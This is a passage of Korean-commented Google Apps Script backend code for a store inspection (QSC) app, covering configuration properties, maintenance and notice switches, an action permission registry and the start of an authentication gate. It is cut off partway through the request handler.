/* QSC 앱 백엔드 (Google Apps Script)
   제출 1번에 3곳 기록:
   ① 응답 원본 시트 (QSC_회차·QSC_상세·쇼퍼_응답) — 추적용 원장
   ② 통합시트 [데이터] — 해당 매장 행 x 해당 월 블록에 점수 기입 (QSC=위생 칸, 쇼퍼=CS 칸)
   ③ 매장별 QSC현황 파일 — 월 탭(YYMM)에 방문일·점수 + 개선 필요 문항을 개선요청 표에 자동 행 추가

   v33부터 여기에 인증·권한·조회 계층이 얹혀 있다 (구현명세 v33 §4~§11·§14).
     · 모든 요청은 단일 POST + 본문 안의 토큰. doGet은 ?action=ping 하나뿐이다
     · ACTIONS 등록표에 없는 함수는 웹에서 도달할 수 없다 (기본 거부)
     · 권한 판정은 can()·resolveTarget() 두 함수만 한다. 역할 이름을 비교하는 코드는 없다
     · 스크립트 속성 AUTH_ENFORCE 가 'off'인 동안은 토큰 없는 옛 요청도 종전처럼 받아준다
       (거부하지 않고 감사로그에만 남긴다). 'on'으로 바꾸는 순간부터 실제로 거부한다.
       ★9월 실업무가 지금과 똑같이 돌아가야 한다는 것이 이 스위치의 존재 이유다★

   배포 절차: script.google.com 새 프로젝트 → 이 코드 붙여넣기 → 아래 ID들 입력
   → 배포 > 새 배포 > 웹 앱 (실행: 나, 액세스: 모든 사용자) → URL을 js/api.js의 APPS_SCRIPT_URL에 입력
   ⚠재배포는 '배포 관리 > 수정 > 새 버전'. '새 배포'를 누르면 /exec 주소가 바뀌어 현장이 즉시 멈춘다.
     그리고 이전 배포는 반드시 '보관처리'할 것 — 옛 URL은 게이트 없는 코드로 영원히 살아 있다.

   ⚠어느 계정으로 만들 것인가: **QSC 담당자 개인 계정**(현재 tlsanstn93). '실행: 나'로 배포되므로
     스크립트는 그 계정 권한으로 동작한다. 통합시트는 보기 권한만 있으면 되고(읽기 전용으로 매장 목록과
     점수를 가져온다), 매장별 시트는 '링크가 있는 사람 편집 가능'이라 개인 계정으로도 쓸 수 있다.
     담당자가 바뀌면 프로젝트 소유권을 이전하면 되고, 그때도 배포 주소는 유지된다.

   드라이브 구조:
     📁 QSC (본사 계정)
        📊 QSC 통합시트          … DASHBOARD_ID   ← 개인 계정은 보기 권한만 (읽기 전용)
        📁 매장현황              … 매장별 QSC현황 시트 26개 (ID 불필요 — 통합시트 D열 링크에서 자동 추출)
     📁 QSC 사진 (개인 계정)      … PHOTO_FOLDER_ID
        2026 / QSC점검      / 매장 / 날짜   ← 관리자 점검 사진
        2026 / 개선보고     / 매장 / 날짜   ← 매장이 올리는 개선 후 사진
     📊 QSC 응답 (개인 계정)      … SPREADSHEET_ID   ← 익명 고객이 글자를 쓸 수 있는 파일
     📊 QSC 인증 (개인 계정)      … AUTH_SHEET_ID    ← 계정·역할·감사로그·매장파일맵. 아무와도 공유하지 말 것

   ★인증 파일을 응답 파일과 분리한 이유(명세 §3-0): 응답 시트에는 익명 고객이 텍스트를 쓴다.
     수식 주입은 safe()로 막지만 방어는 겹쳐야 한다. 자격증명(해시·솔트)이 사용자 입력과
     같은 파일에 있으면 주입 1건이 곧 전체 자격증명 유출이다.

   사진 보관 정책: 드라이브에는 올해치만. 새해에 지난해 폴더를 통째로 내려받아 로컬 보관 후 삭제.
                 사용량은 photoUsage()로 확인. 폴더 최상위를 '연도'로 둔 이유가 이 정리 때문이다. */

/* 파일 ID는 코드에 적지 않는다 — 이 파일은 공개 GitHub 저장소에 올라간다.
   앱스 스크립트 편집기에서 [프로젝트 설정] > [스크립트 속성]에 등록할 것. 명세 §4 전체 목록:

     SPREADSHEET_ID      응답 원본 저장용 'QSC 응답' 스프레드시트
     PHOTO_FOLDER_ID     사진 보관용 '사진' 폴더
     DASHBOARD_ID        '[감사총무팀_QSC] 통합시트'  (보기 전용)
     AUTH_SHEET_ID       'QSC 인증' 스프레드시트      ★신규
     APP_BASE_URL        앱 배포 주소(끝에 /). 비우면 GitHub Pages 기본값. 배포 링크 조립에만 쓴다
     TOKEN_KEY           HMAC 서명 키 (랜덤 44자 이상) ★신규 — 비어 있으면 ensureAuthSheets()가 만든다
     PW_PEPPER           비밀번호 페퍼 (랜덤 32자 이상) ★신규 — 비어 있으면 ensureAuthSheets()가 만든다
     PW_PEPPER_V         페퍼 버전. 기본 '1'
     PW_ITER             비밀번호 반복 해시 횟수. benchPw() 실측으로 확정 (해시 1회 ≤250ms)
     TOKEN_TTL_H         토큰 수명(시간). ★비워 두십시오★ 기본 87600 = 10년 (사실상 무기한 세션)
     TOKEN_MINV          이 값 미만 스키마 버전 토큰 거부 = 전원 강제 로그아웃 스위치. 기본 1
     MAINT               점검 모드. 문구를 넣으면 전 요청 차단(그 문구를 그대로 반환). ★신규★
                         비우면 즉시 해제. 계정관리 권한자(관리자)만 점검 중에도 통과한다
     NOTICE              공지 배너. 문구를 넣으면 모든 화면 상단에 한 줄. ★신규★
                         ★MAINT와 다르다 — 막지 않고 알리기만 한다★. 비우면 배너가 사라진다.
                         사용자가 ✕로 닫아도 문구를 고치면 자동으로 다시 뜬다(id가 문구의 해시라서).
                         공개되는 문구다 — 개인정보를 적지 말 것
     AUTH_ENFORCE        'off'(기본) | 'on'.  off = 토큰 없는 옛 요청도 받아줌(감사로그만)
     STORE_IMPROVE_WRITE 'false'(기본) | 'true'.  매장 개선보고 쓰기
     CACHE_EPOCH         숫자. +1 하면 전 캐시 무효. 기본 1
     LOGIN_FAIL_MAX      기본 10 (10분 내 실패 허용 횟수 → 15분 잠금)
     HASH_BUDGET         기본 300 (시간당 느린 해시 실행 '전역' 상한)
                         ★설치 당일에는 1000으로 올렸다가 다음 날 되돌리십시오★ — 26곳 비밀번호
                         설정(26회) + 그날 저녁 26곳 첫 로그인(26회) + 오타 재시도가 하루에 몰린다
     HASH_BUDGET_ID      기본 12 (시간당 느린 해시 실행 '아이디별' 상한). 실제 브레이크는 이쪽이다
     GLOBAL_FAIL_MAX     기본 40 (시간당 전역 로그인 실패 상한 → 실패 응답 문구만 바뀐다)
     PHOTO_DAY_MAX       기본 200 (계정당 하루 사진 저장 건수)
     IMPROVE_DUE_DAY     기본 10 (익월 며칠까지 종합점수를 '잠정'으로 표시)
     STORE_FILE_WRITE    'false'(기본) | 'true'.  매장 파일에 점검 결과 자동 기록

   (실제 ID는 로컬 문서 `1. QSC\연동_설정값.md`에 기록해 두었다 — 저장소에 올리지 말 것)

   ★속성이 비어 있을 때의 방향(fail-safe): AUTH_SHEET_ID·TOKEN_KEY·PW_PEPPER가 비면 인증은
     '항상 실패'한다(fail-closed). 대신 AUTH_ENFORCE='off'인 동안은 옛 경로가 그대로 살아 있어
     현장 업무는 멈추지 않는다. 즉 "인증을 못 켜면 인증만 안 켜지고, 업무는 돈다". */
const PROPS = PropertiesService.getScriptProperties();
const SPREADSHEET_ID = PROPS.getProperty('SPREADSHEET_ID') || '';
const PHOTO_FOLDER_ID = PROPS.getProperty('PHOTO_FOLDER_ID') || '';
const DASHBOARD_ID = PROPS.getProperty('DASHBOARD_ID') || '';
const DASHBOARD_SHEET = '데이터';
/* 실전 기록 스위치 — 매장별 QSC현황 파일에 실제로 쓸지 여부.
   false = 응답 시트와 사진만 기록하고 매장 파일은 건드리지 않는다 (연동 시험용).
           2026-09까지는 기존 수기 방식으로 운영하므로 반드시 false로 둘 것.
   true  = 매장 파일 개선요청 표에 자동 기록 (전환 시 켠다).
   ※ 켜고 끄는 것은 스크립트 속성 STORE_FILE_WRITE = 'true' 로도 가능 */
const STORE_FILE_WRITE = PROPS.getProperty('STORE_FILE_WRITE') === 'true';
/* 통합시트에 점수를 직접 쓸지 여부 — **영구 false**.
   스크립트가 도는 개인 계정에는 통합시트 '보기' 권한만 있다. 즉 이것은 시험용 스위치가 아니라
   권한이 없어서 못 하는 일이다. 위생·CS 점수는 관리자가 통합시트에 직접 입력하고,
   대시보드(§10)는 그렇게 입력된 값을 '읽기만' 한다. 읽기 전용 권한이 곧 안전장치다 —
   대시보드 코드에 어떤 버그가 있어도 통합시트를 훼손할 수 없다. */
const DASHBOARD_WRITE = false;
const STORE_MAP_SHEET = '매장파일맵'; // 인증 시트 안의 탭: A=매장명, B=매장 파일 ID
const PHOTO_EMBED = true;    // true면 개선요청 표에 사진을 =IMAGE()로 삽입 (사진 파일이 '링크 있는 사용자 보기'로 공유됨) / false면 링크만

/* 인증 스프레드시트 탭 이름 (명세 §3) */
const AUTH_ACCOUNT_SHEET = '계정';
const AUTH_ROLE_SHEET = '역할';
const AUTH_LOG_SHEET = '감사로그';

/* ★`계정` 탭 스키마 — 열 번호를 코드 곳곳에 숫자로 적지 않는다★
   종전에는 F열이 '링크키'였고 서버가 H~L을 썼다. 링크키를 없애면서 F 이후가 한 칸씩 앞으로
   당겨졌는데, getRange(row, 8) 같은 리터럴이 열 곳 넘게 흩어져 있으면 그중 하나만 놓쳐도
   해시 칸에 날짜를 쓰는 사고가 조용히 난다. 그래서 열 번호는 이 표 하나에서만 나온다.
   A~F는 사람이 편집하는 칸이고, 서버는 G~K(hash~lastSeen)만 쓴다. */
const ACCOUNT_HEADER = ['아이디', '이름', '역할', '매장범위', '상태', '비고',
  '해시', '솔트', '반복수', '비번변경일', '최근접속'];
const ACCT_COL = {
  id: 1, name: 2, role: 3, scope: 4, status: 5, note: 6,
  hash: 7, salt: 8, iter: 9, pwAt: 10, lastSeen: 11
};
const ACCOUNT_COLS = ACCOUNT_HEADER.length;   // 11

/* 계정 상태 — E열에 들어갈 수 있는 값은 이 둘뿐이다 (드롭다운을 걸어 두면 오타가 물리적으로 불가능) */
const STATUS_ON = '사용';
const STATUS_OFF = '중지';

/* 화면 메뉴 키 — `역할` 탭 B열이 `*`일 때 이 목록으로 펼친다.
   'debug'는 오류 상세 열람 권한일 뿐 화면이 아니므로 여기에 넣지 않는다.
   'accounts'는 화면(accounts.html)이 있으므로 넣는다 — 관리자 홈에 카드가 뜬다. */
const MENU_KEYS = ['qsc', 'shopper', 'codes', 'dashboard', 'store', 'accounts'];

/* 계정 관리 메뉴 키. 점검 모드(MAINT) 예외 판정에도 이 키를 쓴다 —
   ★`role === '관리자'` 라고 적지 않기 위해서다★. "계정을 관리할 수 있는 사람"이라는
   권한으로 예외를 정의하면 지역담당·팀장이 생겨도 코드가 한 줄도 바뀌지 않는다. */
const ADMIN_MENU = 'accounts';

/* 통합시트 [데이터] 탭 실물 구조 (2026-08-15 확인)
     A 지역 · C 분류 · D 매장명(하이퍼링크로 매장 파일 연결) · 6행부터 매장, 숨김 행 = 관리 제외
   ⚠로컬 엑셀 사본과 한 칸 어긋나 있었다(사본은 E열). 실제 시트 기준은 D열. */
const STORE_NAME_COL = 4; // D열

/* 월 블록의 '위생(QSC) 점수' 열 번호 — 2026-08-15 실물 시트에서 직접 확인.
   블록 안 오프셋: +0 위생점수 +1 위생등급 +2 CS점수 +3 CS등급 +4 개선(요청 건수) +5 종합점수 +6 종합등급
   3·6·9·12월 뒤에 분기 평균 2열이 끼어 있어 간격이 7,7,9로 반복된다.
   ⚠종전 값은 전부 한 칸씩 밀려 있었다(로컬 엑셀 사본 기준이었음) — 매장명 D열 정정과 같은 원인.
     AY6 = 96%(금종제과 7월 위생)로 검증함.
   ⚠"읽기에는 안 쓰인다"는 종전 주석은 거짓이 되었다 — 대시보드(§10)가 이 표로 읽는다. */
const MONTH_COL = { 1: 5, 2: 12, 3: 19, 4: 28, 5: 35, 6: 42, 7: 51, 8: 58, 9: 65, 10: 74, 11: 81, 12: 88 };
const YEAR_COL = { score: 97, grade: 98, improve: 99 }; // 연간 평균점수·등급·개선율 (CS·CT·CU열)

/* 대시보드 응답에 담아도 되는 필드 (명세 §8-4 화이트리스트).
   블랙리스트(전부 만든 뒤 지우기)는 필드가 하나 늘 때마다 유출된다. 반대로 간다 —
   여기 없는 키는 애초에 응답 객체에 담기지 않는다. */
const DASH_PUBLIC = ['rank', 'store', 'region', 'category', 'qsc', 'qscGrade', 'cs', 'csGrade',
  'improve', 'total', 'grade', 'status', 'mine', 'prev', 'delta'];

/* 계정 목록 응답에 담아도 되는 필드. ★해시·솔트·반복수·페퍼버전은 절대 담지 않는다★
   대시보드와 달리 여기서는 '투영'조차 하지 않고 accountRow()가 객체를 직접 조립한다 —
   계정 객체에는 해시가 들어 있으므로, 화이트리스트 루프를 도는 코드가 있으면 언젠가
   목록을 한 줄 늘리는 것만으로 해시가 나간다. 담을 값을 손으로 적는 편이 안전하다. */
const ACCOUNT_PUBLIC = ['id', 'name', 'role', 'status', 'scope', 'hasPw', 'pw', 'pwAt', 'lastSeen'];

/* ---------- 스크립트 속성 읽기 ---------- */

/* 속성은 매 실행마다 다시 읽는다 — 그래서 속성 화면에서 값을 고치면 재배포 없이 즉시 반영된다.
   이 성질이 이 시스템의 롤백 수단 전부다 (AUTH_ENFORCE·STORE_IMPROVE_WRITE·CACHE_EPOCH·STORE_FILE_WRITE). */
function prop(key, def) {
  const v = PROPS.getProperty(key);
  return (v === null || v === undefined || v === '') ? def : v;
}
function propN(key, def) {
  const n = Number(prop(key, def));
  return isNaN(n) ? def : n;
}
/* ★오타는 '켜짐' 쪽으로 넘어가야 한다★. 종전 코드는 `=== 'on'` 이라 'ON'·'On'·'true'·'1'·'on '
   가 전부 off로 판정됐다 — 담당자가 켰다고 믿는 상태에서 게이트가 열려 있는 유일한 스위치였다.
   다른 스위치(STORE_FILE_WRITE 등)는 `=== 'true'`라 오타가 '닫히는' 방향이므로 그대로 둔다.
   여기서는 반대로, '끔'을 뜻하는 흔한 표기를 명시적으로 적었을 때만 끈다. */
function enforceOn() {
  const v = String(prop('AUTH_ENFORCE', 'off')).trim().toLowerCase();
  return !(v === 'off' || v === 'false' || v === '0' || v === 'no' || v === '');
}
function epoch() { return String(propN('CACHE_EPOCH', 1)); }

/* ---------- doGet ---------- */

/* ?action=config 는 제거했다 (명세 §7-1).
   GET 경로를 남겨 두면 언젠가 거기에 토큰을 붙이는 코드가 생기고, 그러면 토큰이 URL·Referer·
   구글 실행 로그에 실린다. 매장 목록은 POST config.get 으로만 내려간다. */
function doGet(e) {
  /* 점검 문구는 여기서도 그대로 내려준다 — 로그인 화면이 POST 한 번 없이도 안내를 띄울 수 있게.
     이 문구는 담당자가 손으로 적는 공지이므로 공개되어도 무방하다(개인정보를 적지 말 것). */
  return json({ ok: true, service: 'qsc-app', v: 'v33', maint: maintMsg(), time: new Date().toISOString() });
}

/* ---------- 점검 모드 (확정사항 7) ---------- */

/* 스크립트 속성 MAINT 에 문구가 들어 있으면 점검 중이다. 비우면 즉시 해제된다
   (속성은 매 실행마다 다시 읽으므로 재배포가 필요 없다 — 이것이 이 스위치의 존재 이유). */
function maintMsg() {
  return String(prop('MAINT', '')).trim().slice(0, 300);
}

/* 점검 중 통과 판정. ★역할 이름을 비교하지 않는다★ — 계정관리(accounts) 메뉴 읽기 권한을
   가진 사람만 통과시킨다. `역할` 탭이 그 권한을 관리자에게만 주고 있으므로 결과는 같지만,
   나중에 역할이 늘어도 이 코드는 바뀌지 않는다.
   반환: { ok:true }  또는  { ok:false, res:<응답> } */
function maintBlock(token) {
  const msg = maintMsg();
  if (!msg) return { ok: true };
  /* ★모양이 토큰이 아닌 것은 verifyToken까지 보내지 않는다★ — 점검 모드는 장애 대응 중에
     켜는 것이라 일일 90분 쿼터가 가장 아쉬운 순간인데, verifyToken은 유효 토큰이면
     계정 시트 읽기와 최근접속 쓰기까지 돈다. 26곳의 재시도 + 외부 요청이 전액 청구되는 자리다.
     형식 검사는 verifyToken 1단계와 같은 조건이라 판정이 갈라지지 않는다. */
  const t = String(token || '');
  if (t && t.length <= 512 && t.indexOf('v1.') === 0 && t.split('.').length === 3) {
    const vr = verifyToken(t);
    if (vr.ok && can(vr.ctx.role, ADMIN_MENU, '읽기').allow) return { ok: true, ctx: vr.ctx };
  }
  /* ★차단마다 감사로그를 남기면 안 된다★ — 점검 중에는 26곳의 앱이 재시도를 계속 던지므로
     요청 1건마다 appendRow(200~400ms)가 붙어 인증 시트가 쓰기로 폭주한다.
     '점검 모드가 켜져 있고 실제로 차단이 일어나고 있다'만 알면 되므로 10분에 1줄만 남긴다. */
  try {
    const cache = CacheService.getScriptCache();
    if (!cache.get('mnt:log')) {
      cache.put('mnt:log', '1', 600);
      auditLog(anonCtx(), 'maint', '', '차단', 'MAINT', msg.slice(0, 100));
    }
  } catch (e) { }
  return { ok: false, res: { ok: false, code: 'MAINT', error: msg } };
}

/* ---------- 공지 배너 (NOTICE) ---------- */

/* ★MAINT와 다른 것★ — MAINT는 '차단'이고 NOTICE는 '알리기만'이다. 두 속성을 헷갈리면
   공지를 띄우려다 26곳을 멈추게 되므로 코드에서도 나란히 두고 이 문장을 남긴다.

   id는 문구의 SHA-256 앞 6자다. 사용자가 ✕로 닫으면 프론트가 그 id를 localStorage에 넣고
   같은 id는 다시 띄우지 않는데, ★문구를 고치면 id가 저절로 달라져 다시 뜬다★.
   "닫은 사람에게 새 공지를 어떻게 다시 보여주는가"를 담당자가 조작하지 않아도 되게 하는 것이
   해시를 쓰는 유일한 이유다(버전 번호 칸을 하나 더 만들면 그 칸을 올리는 것을 잊는다).

   ★비어 있으면 아예 담지 않는다★ — 빈 객체를 내려보내면 화면이 빈 줄을 한 칸 그린다.
   그래서 이 함수는 null을 돌려주고, 부르는 쪽이 null이면 키를 만들지 않는다. */
function noticeObj() {
  /* 300자에서 자른 '뒤에' 해시한다 — 자르기 전에 해시하면 화면에 보이는 문구와 id가
     달라져, 뒤쪽만 고친 공지가 같은 id로 묻히거나 반대로 안 바뀐 공지가 다시 뜬다. */
  const text = String(prop('NOTICE', '')).trim().slice(0, 300);
  if (!text) return null;
  return { id: sha256Hex(text).slice(0, 6), text: text };
}

/* 응답 객체에 notice를 붙인다(있을 때만). 부르는 쪽이 매번 null 검사를 적지 않게 하려는 것뿐이다. */
function withNotice(res) {
  const n = noticeObj();
  if (n && res && res.ok) res.notice = n;
  return res;
}

/* ---------- 액션 등록표 (명세 §7-2) ---------- */

/* 이 표에 없는 함수는 웹에서 도달할 수 없다. 새 기능층 함수를 만들어도 등록하지 않으면
   자동으로 막힌다 — "권한 설정을 깜빡했다"가 구조적으로 불가능해진다.
     menu  : `역할` 탭 B열과 조인할 키. ''면 메뉴 게이트 없음(토큰만 필요)
     act   : '읽기' | '쓰기' | ''
     scope : 'none' | 'list' | 'target'   (resolveTarget이 해석)
     anon  : 토큰 없이 도달 가능한 액션 (익명 설계)
     legacy: v33 이전부터 있던 액션. AUTH_ENFORCE='off'인 동안만 토큰 없이 통과한다
     idem  : reqId 멱등성 적용
     max   : 본문 상한(바이트) */
function actionTable() {
  const KB = 1024, MB = 1024 * 1024;
  /* qsc.submit 이 12MB인 이유: ui-photo.js의 TARGET_BYTES(180KB)는 목표이지 상한이 아니다.
     base64는 4/3배라 장당 약 240KB이고 40장이면 9.6MB다. 74문항을 다 마치고 제출을 누른 순간
     BAD_REQUEST로 전부 날아가는 사고를 막기 위해 상한을 넉넉히 둔다. */
  /* survey.submit 상한. ★영수증 사진 첨부를 2026-08-20에 없애서 이제 글자만 오간다★
     (38문항 답 + 비고). 그래도 상한을 크게 줄이지는 않는다 — 비고를 길게 쓴 응답 하나가
     BAD_REQUEST로 통째로 날아가는 것이 훨씬 비싼 사고이기 때문이다.
     대역폭·파싱 비용을 막는 몫은 anonThrottle이 맡는다. */
  const surveyMax = 1 * MB;
  return {
    'auth.login':         { menu: '', act: '', scope: 'none', anon: true, max: 2 * KB, fn: fnLogin },
    /* setPassword는 anon이 아니라 '선택적 인증'이다. anon으로 두면 doPost가 토큰을 아예 검증하지
       않아 ctx.auth가 영원히 false가 되고, §7-3의 "본인 변경(토큰 + curPw)" 경로가 도달 불가능해진다.
       토큰이 없으면 익명(설정코드 경로), 토큰이 있으면 반드시 유효해야 한다. */
    'auth.setPassword':   { menu: '', act: '', scope: 'none', optAuth: true, max: 2 * KB, fn: fnSetPassword },
    'auth.session':       { menu: '', act: '', scope: 'none', max: 1 * KB, fn: fnSession },
    'config.get':         { menu: '', act: '읽기', scope: 'none', legacy: true, max: 1 * KB, fn: fnConfig },
    /* ★로그인 화면 전용 매장명 목록 — AUTH_ENFORCE='on'을 켜는 날을 위한 것이다★
       로그인 화면에는 토큰이 없으므로 그날부터 config.get이 AUTH_REQUIRED로 죽고, 아이디
       자동완성은 앱에 동봉된 data/master.json에 박제된다. 시트에서 매장명을 고치면 자동완성이
       '틀린 답'을 적극적으로 제시하게 되어 자유 입력보다 나빠진다.
       담기는 것은 매장명뿐이다 — 이미 간판·QR·카톡으로 공개된 값이고, naPresets는 싣지 않는다.
       버킷은 survey와 같은 'anon'이라 이 요청이 몰려도 로그인(auth 버킷)은 막히지 않는다. */
    'config.stores':      { menu: '', act: '', scope: 'none', anon: true, max: 1 * KB, fn: fnConfigStores },
    'qsc.submit':         { menu: 'qsc', act: '쓰기', scope: 'none', legacy: true, idem: true, max: 12 * MB, fn: fnQscSubmit },
    'shopper.submit':     { menu: 'shopper', act: '쓰기', scope: 'none', legacy: true, idem: true, max: 3 * MB, fn: fnShopperSubmit },
    'survey.submit':      { menu: '', act: '', scope: 'none', anon: true, idem: true, max: surveyMax, fn: fnSurveySubmit },
    'dashboard.get':      { menu: 'dashboard', act: '읽기', scope: 'list', max: 2 * KB, fn: fnDashboard },
    'store.get':          { menu: 'store', act: '읽기', scope: 'target', max: 2 * KB, fn: fnStoreGet },
    'store.saveImprove':  { menu: 'store', act: '쓰기', scope: 'target', idem: true, max: 400 * KB, fn: fnStoreSave },
    /* 계정 관리 (accounts.html) — 전부 menu:'accounts'라 `역할` 탭이 관리자에게만 열어 준다.
       legacy 플래그가 없으므로 AUTH_ENFORCE='off'여도 토큰 없이는 도달할 수 없다.
       scope:'none'이라 payload.store는 읽지도 않는다. */
    'account.list':        { menu: ADMIN_MENU, act: '읽기', scope: 'none', max: 2 * KB, fn: fnAccountList },
    'account.setPassword': { menu: ADMIN_MENU, act: '쓰기', scope: 'none', max: 2 * KB, fn: fnAccountSetPassword },
    'account.setStatus':   { menu: ADMIN_MENU, act: '쓰기', scope: 'none', max: 2 * KB, fn: fnAccountSetStatus },
    'account.sync':        { menu: ADMIN_MENU, act: '쓰기', scope: 'none', max: 1 * KB, fn: fnAccountSync },
    /* 홈 화면 알림 배지. menu:'store'라 `역할` 탭의 매장담당자 store 읽기 행이 그대로 연다 —
       배지를 위한 새 권한 어휘를 만들지 않는다(개선요청 표를 읽는 것이 곧 배지의 재료다).
       scope:'none'이라 payload.store는 읽지도 않는다. 대상 매장은 ctx.stores 하나가 정한다. */
    'notify.badge':       { menu: 'store', act: '읽기', scope: 'none', max: 1 * KB, fn: fnNotifyBadge },
    /* 미제출 현황판·감사로그 열람 — 둘 다 menu:'accounts'라 `역할` 탭이 관리자에게만 열어 준다.
       ★코드에 `role === '관리자'`를 적지 않는다★ */
    'status.month':       { menu: ADMIN_MENU, act: '읽기', scope: 'none', max: 1 * KB, fn: fnStatusMonth },
    'audit.list':         { menu: ADMIN_MENU, act: '읽기', scope: 'none', max: 1 * KB, fn: fnAuditList },
    /* codes.* 는 '게이트 예약'이다 — 화면(codes.html)은 있지만 서버 기능층은 아직 없다.
       미리 등록해 두어야 나중에 함수를 붙일 때 권한 줄을 빠뜨릴 수 없다. */
    'codes.*':            { menu: 'codes', act: '읽기', scope: 'none', idem: true, max: 2 * KB, fn: fnNotReady }
  };
}

/* 옛 봉투 별칭 (명세 §7-3). 별칭에도 게이트가 똑같이 적용된다 — 별칭이 우회로가 되면 안 된다.
   ★survey를 추가한 이유★: js/api.js의 call()은 토큰이 없으면 body.action을 싣지 않고
   body.type=<legacyType> 만 보낸다. survey.html에는 auth.js가 없어 토큰이 영원히 없으므로,
   프론트가 Api.submit('survey', …)로 바꿔도 이 줄이 없으면 BAD_REQUEST가 난다.
   survey.submit은 anon:true라 이 별칭을 타도 AUTH_ENFORCE와 무관하게 익명으로 통과한다
   (즉 'on'으로 켜는 날에도 고객 설문은 죽지 않는다). */
const LEGACY_ALIAS = { qsc: 'qsc.submit', shopper: 'shopper.submit', survey: 'survey.submit' };

/* ★hasOwnProperty로 조회한다★ — t[action]만 보면 'toString'·'constructor'·'__proto__'·'valueOf'가
   프로토타입 체인에서 truthy를 돌려줘 spec으로 통과한다. 그러면 spec.max·spec.menu가 undefined라
   길이 검사와 권한 검사가 통째로 건너뛰어지고, spec.fn이 함수가 아니어서 SERVER_ERROR가 날 때까지
   요청 1건마다 감사로그 appendRow(200~400ms)를 강제할 수 있다. 등록표의 '기본 거부'는
   결과적으로가 아니라 구조적으로 지켜져야 한다. */
function actionSpec(action) {
  const t = actionTable();
  if (Object.prototype.hasOwnProperty.call(t, action)) return t[action];
  // codes.list / codes.save … 는 하나의 예약 항목으로 묶는다
  if (/^codes\.[a-zA-Z]+$/.test(action)) return t['codes.*'];
  return null;
}

/* ---------- doPost — 게이트 (명세 §8-1. 이 순서를 바꾸지 말 것) ---------- */

/*  0. 본문 길이 검사 (파싱 전에!)      1. JSON.parse
 *  1.5 ★점검 모드(MAINT)★ — 게이트의 가장 앞단
 *  2. ACTIONS 조회 [기본 거부]         3. 액션별 maxBody
 *  4. 익명 액션이면 익명 스로틀         5. verifyToken  ★openById 보다 앞★
 *  6. 레이트리밋                      7. can() + resolveTarget()
 *  8. reqId 멱등성 (busy 선기록)       9. 기능층 호출
 * 10. 쓰기면 감사로그                 11. json() 단일 출구
 * 12. 전 구간 try/catch → SERVER_ERROR.  ★throw 금지★
 *
 * 5번이 openById 보다 앞이라는 점이 중요하다. 미인증 요청이 시트 열기 비용(수백 ms)을 물면
 * 그것 자체가 DoS 수단이 된다.
 *
 * ★doPost 안에서 e.parameter 를 읽는 코드를 절대 만들지 말 것★ — 앱스 스크립트는 POST에도
 *   e.parameter를 채우므로, 폴백이 하나라도 있으면 POST /exec?token=… 으로 토큰이 URL에 남는다. */
function doPost(e) {
  let action = '';
  let ctx = null;
  let spec = null;
  let target = null;
  let reqKey = '';
  try {
    // 0 — 파싱 전에. 거대한 문자열의 JSON.parse가 메모리·시간을 태운다
    const raw = (e && e.postData && e.postData.contents) ? e.postData.contents : '';
    if (raw.length > 12 * 1024 * 1024) return json(err('BAD_REQUEST', '요청이 너무 큽니다.'));

    /* 0.5 — ★점검 중에는 큰 본문을 파싱조차 하지 않는다★
       1.5단계(maintBlock)는 어차피 전부 차단하는데, 그 앞에 12MB JSON.parse가 그대로 붙어
       있었다. 점검 모드는 장애 대응 중에 켜는 것이라 일일 90분 쿼터가 가장 아쉬운 순간이고,
       그때 26곳의 재시도가 전액 청구된다. 토큰이 실린 본문은 1KB를 넘지 않으므로
       4KB를 넘는 본문은 어차피 통과 대상이 아니다(관리자 예외도 이 크기 안에 든다). */
    const maint0 = maintMsg();
    if (maint0 && raw.length > 4096) return json({ ok: false, code: 'MAINT', error: maint0 });

    // 1 — ★내용을 로그에 남기지 않는다★ (비밀번호가 실행 로그에 영구히 남는다)
    let body;
    try { body = JSON.parse(raw); } catch (e1) { return json(err('BAD_REQUEST', '요청 형식이 올바르지 않습니다.')); }
    if (!body || typeof body !== 'object') return json(err('BAD_REQUEST', '요청 형식이 올바르지 않습니다.'));

    /* 1.5 — ★점검 모드★ 게이트의 가장 앞단.
       ★JSON.parse 뒤일 수밖에 없다★ — 통과 예외를 판정하려면 토큰을 봐야 하고, 토큰은
       본문에만 실린다(URL로 받는 경로를 만들지 않는 것이 이 시스템의 원칙이다). 대신
       등록표 조회·스로틀·시트 열기보다 앞이라 실질적으로 '전 요청 차단'이 맞다.
       익명 설문(survey.submit)도 여기서 함께 막힌다 — anon 분기보다 위에 있다. */
    const mr = maintBlock(body.token);
    if (!mr.ok) return json(mr.res);
    /* 통과한 경우 ctx를 여기서 넘겨받지 않는다 — 아래 5번이 정상 경로로 다시 검증한다.
       점검 중에만 HMAC 1회가 더 도는데, 그 대가로 "인증 경로가 두 곳"이 되지 않는다. */

    // 2 — 등록표 조회 [기본 거부]
    let legacyType = '';
    action = String(body.action || '');
    if (!action && body.type) {
      legacyType = String(body.type);
      action = LEGACY_ALIAS[legacyType] || '';
    }
    spec = actionSpec(action);
    if (!spec) return json(err('BAD_REQUEST', '알 수 없는 요청입니다.'));

    // 3 — 액션별 상한
    if (raw.length > spec.max) return json(err('BAD_REQUEST', '보낼 수 있는 용량을 넘었습니다. 사진 수를 줄여 주세요.'));

    const payload = (body.payload && typeof body.payload === 'object') ? body.payload : {};

    // 4·5 — 익명 액션 / 토큰 검증
    if (spec.anon) {
      ctx = anonCtx();
      /* 로그인 계열과 설문을 같은 버킷에 담으면 안 된다 — 공개된 설문지를 시간당 200건
         제출하는 것만으로 전 계정 로그인이 RATE_LIMITED가 된다(반대로 설문이 몰리는 날에는
         담당자가 로그인하지 못한다). 버킷을 나눈다. */
      const th = anonThrottle(action.indexOf('auth.') === 0 ? 'auth' : 'anon');
      if (!th.ok) return json(th);
    } else if (spec.optAuth) {
      /* 선택적 인증 — 토큰이 없으면 익명으로, 있으면 반드시 유효해야 한다.
         ★"있는데 검증 실패면 익명으로 강등"으로 짜면 안 된다★ — 아무 문자열이나 토큰 자리에
         붙이는 것으로 익명 경로를 되찾는 우회가 생긴다. */
      if (body.token) {
        const vr0 = verifyToken(body.token);
        if (!vr0.ok) return json(err(vr0.code, vr0.msg));
        ctx = vr0.ctx;
      } else {
        ctx = anonCtx();
        const th = anonThrottle('auth');
        if (!th.ok) return json(th);
      }
    } else {
      const vr = verifyToken(body.token);
      if (vr.ok) {
        ctx = vr.ctx;
      } else if (legacyType && enforceOn()) {
        /* 옛 봉투인데 인증을 켠 뒤 = 토큰 없이 제출한 요청(구버전 앱, 또는 세션이 끊긴 새 앱).
